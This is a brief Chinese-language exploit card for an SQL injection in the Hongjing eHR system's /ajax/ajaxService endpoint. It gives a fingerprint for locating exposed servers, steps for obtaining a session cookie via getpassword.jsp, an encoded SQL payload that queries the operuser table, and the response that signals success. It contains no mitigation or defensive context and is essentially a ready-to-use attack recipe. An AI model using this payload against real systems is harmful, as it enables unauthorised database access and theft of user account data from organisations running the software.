# 宏景eHRajaxajaxServiceSQL注入漏洞复现

宏景eHRajaxajaxService ｜ SQL注入 ｜ —
- **指纹**：`body="hjaxmanage.js"`
- **请求**：`POST /ajax/ajaxService HTTP/1.1`

**Payload**
```
获取cookie
/templates/index/getpassword.jsp
Host:
Cookie: 抓到的cookie
Content-Type: application/x-www-form-urlencoded
__type=extTrans&__xml={"functionId":"151211001137","sql":"select~20sys.fn_sqlvarbasetostr(HASHBYTES('MD5','1'))~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser","nbase":"1"}
```
- **响应特征**：200 0xc4c